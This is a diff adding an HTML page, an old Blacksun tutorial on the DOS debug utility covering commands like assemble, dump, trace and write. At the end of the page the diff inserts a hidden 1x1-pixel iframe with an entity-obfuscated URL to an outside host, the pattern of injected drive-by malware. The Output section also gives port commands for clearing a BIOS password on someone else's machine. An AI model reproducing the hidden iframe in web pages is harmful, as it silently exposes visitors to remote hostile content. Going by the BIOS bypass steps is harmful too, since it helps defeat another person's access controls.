@@ -1,0 +1,499 @@
+<html>
+<head>
+<title>Debug</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#000000" text="#ffffff" link="#ffffff" vlink="#ffffff">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr>
+    <td width="693">
+      <pre>
+                        :::::::::   ::::::::  :::::::::  ::::::::::
+                        :+:    :+: :+:    :+: :+:    :+: :+:
+                        +:+    +:+ +:+        +:+    +:+ +:+
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#
+                        +#+    +#+        +#+ +#+    +#+ +#+
+                        #+#    #+# #+#    #+# #+#    #+# #+#
+                        #########   ########  ###    ### ###
+
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>     debug  </b>            I   Written by:     /
+    >                     I                             I                  <
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   Ralph           \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p>Version: 1.0<br>
+Date: 8/1/00</p>
+<p>Debug is a program that comes with modern versions of DOS (I do not know when I started shipping out with DOS).
+   Anyway, all Windows users should have it already.<p>
+<p>It's a great tool for debuging programs, unassembling and cracking, and reading "hidden" memory areas like the boot
+   sector, and much more.</p>
+<p>The following was copied from an assembly tutorial who's author we cannot credit, because we have no idea who he is.</p>
+<p>Get into DOS and type "debug", you will get a prompt like this:</p>
+<blockquote>-</blockquote>
+<p>now type "?", you should get the following response:</p>
+<blockquote>
+<table width="500">
+<tr>
+  <td><a href="#assemble">assemble</a></td><td>A [address]</td>
+</tr>
+<tr>
+  <td><a href="#compare">compare</a></td><td>C range address</td>
+</tr>
+<tr>
+  <td><a href="#dump">dump</a></td><td>D [range]</td>
+</tr>
+<tr>
+  <td><a href="#enter">enter</a></td><td>E address [list]</td>
+</tr>
+<tr>
+  <td><a href="#fill">fill</a></td><td>F range list</td>
+</tr>
+<tr>
+  <td><a href="#go">go</a></td><td>G [=address] [addresses]</td>
+</tr>
+<tr>
+  <td><a href="#hex">hex</a></td><td>H value1 value2</td>
+</tr>
+<tr>
+  <td><a href="#input">input</a></td><td>I port</td>
+</tr>
+<tr>
+ <td><a href="#load">load</a></td><td>L [address] [drive] [firstsector] [number]</td>
+</tr>
+<tr>
+  <td><a href="#move">move</a></td><td>M range address</td>
+</tr>
+<tr>
+  <td><a href="#name">name</a></td><td>N [pathname] [arglist]</td>
+</tr>
+<tr>
+  <td><a href="#output">output</a></td><td>O port byte</td>
+</tr>
+<tr>
+  <td><a href="#proceed">proceed</a></td><td>P [=address] [number]</td>
+</tr>
+<tr>
+  <td><a href="#quite">quit</a></td><td>Q</td>
+</tr>
+<tr>
+  <td><a href="#register">register</a></td><td>R [register]</td>
+</tr>
+<tr>
+  <td><a href="#search">search</a></td><td>S range list</td>
+</tr>
+<tr>
+  <td><a href="#trace">trace</a></td><td>T [=address] [value]</td>
+</tr>
+<tr>
+  <td><a href="#unassemble">unassemble</a></td><td>U [range]</td>
+</tr>
+<tr>
+  <td><a href="#write">write</a></td><td>W [address] [drive] [firstsector] [number]</td>
+</tr>
+<tr>
+  <td>allocate expanded memory</td><td>XA [#pages]</td>
+</tr>
+<tr>
+  <td>deallocate expanded memory</td><td>XD [handle]</td>
+</tr>
+<tr>
+  <td>map expanded memory pages</td><td>XM [Lpage] [Ppage] [handle]</td>
+</tr>
+<tr>
+  <td>display expanded memory status</td><td>XS</td>
+</tr>
+</table>
+</blockquote>
+<p>Lets go through each of these commands:</p>
+<a name="assemble"><h3>Assemble:</h3>
+<p>-a<br>
+   107A:0100</p>
+<p>At this point you can start assembling some programs, just like using a assembler.
+However the debug assembler is very limited as you will probably notice.  Lets try
+to enter a simple program:</p>
+<p>-a<br>
+107A:0100 MOV AH,02<br>
+107A:0102 MOV DL,41<br>
+107A:0104 INT 21<br>
+107A:0106 INT 20<br>
+-g<br>
+A</p>
+<p>Program terminated normally</p>
+<p>That's the same program we did at the end of the previous chapter.  Notice how you
+run the program you just entered with "g", and also notice how the set-up part is not
+there?  That's because debug is just too limited to support that.<br>
+Another thing you can do with assemble is specify the address at which you want to start,
+by default this is 0100 since that's where all .COM files start.</p>
+
+
+<a name="compare"><h3>Compare:</h3>
+<p>Compare takes 2 block of memory and displays them side by side, byte for byte.  Lets do
+an example.  Quite out of debug if you haven't already using "q".
+Now type "debug c:\command.com"</p>
+<p>-c 0100 l 8 0200<br>
+10A3:0100  7A  06  10A3:0200</p>
+<p>This command compared offset 0100 with 0200 for a length of 8 bytes.  Debug responded
+with the location that was DIFFERENT.  If 2 locations were the same, debug would just
+omit them, if all are the same debug would simply return to the prompt without any
+response.</p>
+
+
+<a name="dump"><h3>Dump:</h3>
+<p>Dump will dump a specified memory segment.  To test it, code that assembly program again:</p>
+<p>C:\>debug<br>
+-a<br>
+107A:0100 MOV AH,02<br>
+107A:0102 MOV DL,41<br>
+107A:0104 INT 21<br>
+107A:0106 INT 20<br>
+-d 0100 l 8<br>
+107A:0100  B4 02 B2 41 CD 21 CD 20</p>                             ...A.!.
+
+<p>The "B4 02 B2 41 CD 21 CD 20" is the program you just made in machine language.</p>
+<p>B4 02 = MOV AH,02<br>
+B2 41 = MOV DL,41<br>
+CD 21 = INT 21<br>
+CD 20 = INT 20</p>
+<p>The "...A.!." part is your program in ASCII.  The "." represent non-printable characters.
+Notice the A in there.</p>
+
+
+<a name="enter"><h3>Enter:</h3>
+<p>This is one of the hard commands.  With it you can enter/change certain memory areas.
+Lets change our program so that it prints a B instead of an A.</p>
+<table>
+<tr>
+  <td>-e 0103</td>
+  <td>&lt;-- edit program at segment 0103</td>
+</tr>
+<tr>
+  <td>107A:0103  41.42</td>
+  <td>&lt;-- change 41 to 42</td>
+</tr>
+<tr>
+ <td colspan="2">-g</td>
+</tr>
+<tr>
+  <td colspan="2">B</td>
+</tr>
+</table>
+<p>Program terminated normally<br>
+-<br>
+Wasn't that amazing?</p>
+
+
+<a name="fill"><h3>Fill:</h3>
+<p>This command is fairly useless, but who knows....<br>
+It fills the specified amount of memory with the specified data.  Lets for example clear
+out all memory from segment 0100 to 0108, which happens to be our program.</p>
+<table>
+<tr>
+  <td>-f 0100 l 8 0</td>
+  <td>&lt;-- file offset 0100 for a length of 8 bytes with 0</td>
+</tr>
+<tr>
+  <td>-d 0100 l 8</td>
+  <td>&lt;-- verify that it worked</td>
+</tr>
+<tr>
+  <td>107A:0100  00 00 00 00 00 00 00 00</td>
+  <td>.......</td>
+</tr>
+<tr>
+  <td colspan="2">Yep, it worked.</td>
+</tr>
+</table>
+<a name="go"><h3>Go:</h3>
+<p>So far we used go (g) to start the program we just created.  But Go can be used for much
+more.  For example, lets say we want to execute a program at 107B:0100:</p>
+<table>
+<tr>
+  <td>-r CS</td>
+  <td>&lt;-- set the CS register to point to 107B</td>
+</tr>
+<tr>
+  <td colspan="2">CS 107A</td>
+</tr>
+<tr>
+  <td colspan="2">:107B</td>
+</tr>
+<tr>
+  <td>-g =100</td>
+</tr>
+</table>
+<p>You can also set breakpoints.</p>
+<table>
+<tr>
+  <td>-a</td>
+  <td>&lt;-- enter our original program so we have something</td>
+</tr>
+  <td>107A:0100 MOV AH,02</td>
+  <td>to work with</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0102 MOV DL,41</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0104 INT 21</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0106 INT 20</td>
+<tr>
+</tr>
+  <td>-g 102</td>
+  <td><-- set up a break point at 107A:0102</td>
+</tr>
+</table>
+<p>At this point the program will stop, display all registers and the current instruction.</p>
+
+
+<a name="hex"><h3>Hex:</h3>
+<p>This can be very useful.  It subtracts and adds two hexadecimal values:</p>
+<table>
+<tr>
+  <td colspan="2">-h 2 1</td>
+</tr>
+<tr>
+  <td>0003  0001</td>
+  <td>&lt;-- 2h + 1+ = 3h and 2h - 1h = 1h</td>
+</tr>
+</table>
+<p>This is very useful for calculating a programs length, as you will see later.</p>
+
+
+<a name="input"><h3>Input:</h3>
+<p>This is one of the more advanced commands, and I decided not to talk about it too much
+for now.  It will read a byte of data from any of your computers I/O ports (keyboard,
+mouse, printer, etc).<p>
+<p>-i 3FD<br>
+60<br>
+-</p>
+<p>Your data may be different.<br>
+In case you want to know, 3FD is Com port 1, also known as First Asynchronous Adapter.</p>
+
+
+<a name="load"><h3>Load:</h3>
+<p>This command has 2 formats.  It can be used to load the filename specified with the
+name command (n), or it can load a specific sector.</p>
+<p>-n c:\command.com<br>
+-l</p>
+<p>This will load command.com into debug.  When a valid program is loaded all registers will
+be set up and ready to execute the program.<br>
+The other method is a bit more complicated, but potential also more usefull.  The syntax is</p>
+<blockquote>
+<p>L &lt;address&gt; &lt;drive letter/&gt; &lt;sector&gt; &lt;amount to load&gt;<br>
+-l 100 2 10 20</p>
+</blockquote>
+<p>This will load starting at offset 0100 from drive C (0 = A, 1 = B, 2 = C, etc), sector
+10h for 20h sectors.  This can be useful for recovering files you deleted.</p>
+
+
+<a name="move"><h3>Move:</h3>
+<p>Move takes a byte from the starting address and moves it to the destination address.
+This is very good to temporary move data into a free area, than manipulate it without
+having to worry about affecting the original program.  It is especially useful if
+used in conjunction with the r command to which I will get later.  Lets try an example:</p>
+<table>
+<tr>
+  <td>-a</td>
+  <td>&lt;-- enter our original program so we have something</td>
+</tr>
+<tr>
+  <td>107A:0100 MOV AH,02</td>
+  <td>to work with</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0102 MOV DL,41</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0104 INT 21</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0106 INT 20</td>
+</tr>
+<tr>
+  <td>-m 107A:0100 L 8 107B:0100</td>
+  <td>&lt;-- more 8 bytes starting from 107A:0100 into 107B:0100</td>
+</tr>
+<tr>
+  <td>-e 107B:0103</td>
+  <td>&lt;-- edit 107B:0103</td>
+</tr>
+<tr>
+  <td>107B:0103  41.42</td>
+  <td>&lt;-- and change it 42 (B)</td>
+</tr>
+<tr>
+  <td>-d 107A:0100 L 8</td>
+  <td>&lt;-- make sure it worked</td>
+</tr>
+<tr>
+  <td>107A:0100  B4 02 B2 41 CD 21 CD 20</td>
+  <td>...A.!.</td>
+</tr>
+<tr>
+  <td colspan="2">-d 107B:0100 L 8</td>
+</tr>
+<tr>
+  <td>107A:0100  B4 02 B2 42 CD 21 CD 20</td>
+  <td>...B.!.</td>
+</tr>
+<tr>
+  <td>-m 107B:0100 L 8 107A:0100</td>
+  <td>&lt;-- restore the original program since we like the changes.</td>
+</tr>
+</table>
+<a name="name"><h3>Name:</h3>
+<p>This will set debug up with a filename to use for I/O commands.  You have to include
+the file extension, and you may use addition commands:</p>
+<p>-n c:\command.com</p>
+
+
+<a name="output"><h3>Output:</h3>
+<p>Exactly what you think it is.  Output sends stuff to an I/O port.  If you have an
+external modem with those cool lights on it, you can test this out.  Find out what port
+your modem is on and use the corresponding hex number below:</p>
+<p>Com 1 = 3F8 - 3FF (3DF for mine)<br>
+Com 2 = 2F8 - 2FF<br>
+Com 3 = ??? - ??? (if someone knows, please let me know)</p>
+<p>Now turn on the DTA (Data Terminal Ready) bit by sending 01h to it:</p>
+<tabel>
+<tr>
+  <td>-o XXX 1</td>
+  <td>&lt;-- XXX is the com port in hex<td>
+</tr>
+</table>
+<p>As soon as you hit enter, take a look at your modem, you should see a light light up.
+You can have even more fun with the output command.  Say someone put one of those BIOS
+passwords on "your" computer.  Usually you'd have to take out the battery to get rid of
+it, but not anymore:</p>
+<p>MI/AWARD BIOS<br>
+-o 70 17<br>
+-o 71 17</p>
+
+<p>QPHOENIX BIOS<br>
+-o 70 FF<br>
+-o 71 17</p>
+
+<p>QGENERIC<br>
+-o 70 2E<br>
+-o 71 FF</p>
+
+<p>These commands will clear the BIOS memory, thus disabling the password.</p>
+
+
+<a name="proceed"><h3>Proceed:</h3>
+<p>Proceeds in the execution of a program, usually used together withy Trace, which I
+will cover later.  Like the go command, you can specify an address from which to start</p>
+<p>using =address<br>
+-p 2</p>
+<p>Debug will respond with the registers and the current command to be executed.</p>
+
+
+<a name="quite"><h3>Quite:</h3>
+<p>This has got to be the most advanced feature of debug, it exits debug!</p>
+<p>-q</p>
+
+
+<a name="register"><h3>Register:</h3>
+<p>This command can be used to display the current value of all registers, or to manually
+set them.  This is very useful for writing files as you will see later on.</p>
+<p>-r AX<br>
+AX: 011B<br>
+:5<br>
+-</p>
+
+
+<a name="search"><h3>Search:</h3>
+<p>Another very useful command.  It is used to find the occurrence of a specific byte, or
+series of bytes in a segment.  The data to search for can by either characters, or a
+hex value.  Hex values are entered with a space or comma in between them, and characters
+are enclosed with quotes (single or double).  You can also search for hex and characters
+with the same string:</p>
+<table>
+<tr>
+  <td>-n c:\command.com</td>
+  <td>&lt;-- load command.com so we have some data to search in</td>
+</tr>
+<tr>
+  <td colspan="2">-l</td>
+</tr>
+<tr>
+  <td>-s 0 l 0 "MS-DOS"</td>
+  <td>&lt;-- search entire memory block for "MS-DOS"</td>
+</tr>
+<tr>
+  <td>10A3:39E9</td>
+  <td>&lt;-- found the string in 10A3:39E9</td>
+</tr>
+</table>
+<p>NOTE:  the search is case sensitive!</p>
+
+
+<a name="trace"><h3>Trace:</h3>
+<p>This is a truly great feature of debug.  It will trace through a program one instruction
+at a time, displaying the instruction and registers after each.  Like the go command
+you can specify where to start executing from, and for how long.</p>
+<table>
+<tr>
+  <td>-a</td>
+  <td>&lt;-- yes, this thing again</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0100 MOV AH,02</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0102 MOV DL,41</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0104 INT 21</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0106 INT 20</td>
+</tr>
+<tr>
+  <td colspan="2">-t =0100 8</td>
+</tr>
+</table>
+<p>If you leave out the amount of instructions that you want to trace, you can use the
+proceed (p) to continue the execution as long as you want.</p>
+
+
+<a name="unassemble"><h3>Unassemble:</h3>
+<p>Unassembles a block of code.  Great for debugging (and cracking)</p>
+<table>
+<tr>
+  <td>-u 100 L 8</td>
+  <td>&lt;-- unassembles 8 bytes starting at offset 100</td>
+</tr>
+<tr>
+  <td>107A:0100 MOV AH,02</td>
+  <td>&lt;-- debut's response</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0102 MOV DL,41</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0104 INT 21</td>
+</tr>
+<tr>
+  <td colspan="2">107A:0106 INT 20</td>
+</tr>
+</table>
+
+
+<a name="write"><h3>Write:</h3>
+<p>This command works very similar to Load.  It also has 2 ways it can operate:  using name,
+and by specifying an exact location.  Refer to back to Load for more information.</p>
+<p>NOTE:  The register CX must be set the file size in order to write!<br>
+NOTE:  Write will not write .EXE or .HEX files.</p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
